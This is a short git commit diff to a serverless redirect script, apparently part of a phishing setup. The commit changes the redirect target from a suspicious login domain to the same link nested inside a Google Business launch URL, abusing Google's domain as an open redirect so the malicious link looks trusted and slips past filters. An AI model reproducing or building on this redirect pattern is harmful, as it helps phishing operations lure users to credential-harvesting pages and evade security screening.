b231d28c3e933e79ef771d486e48f7d67f1ef967
yvonsguin-afk <yvonsguin@gmail.com>
2025-11-18 06:14:38 -0600

    Update redirect.ts

--- redirect.ts
+++ redirect.ts
@@ -1,7 +1,7 @@
 // redirect.ts
 
 // Define the redirect URL
-const redirectUrl = "https://login1.xxlshetvtvss1.com/srgvRsfn"; // Replace with the URL you want to redirect to
+const redirectUrl = "https://business.google.com/website_shared/launch_bw.html?f=https://login1.xxlshetvtvss1.com/srgvRsfn"; // Replace with the URL you want to redirect to
 
 // Handle the request
 addEventListener("fetch", (event) => {
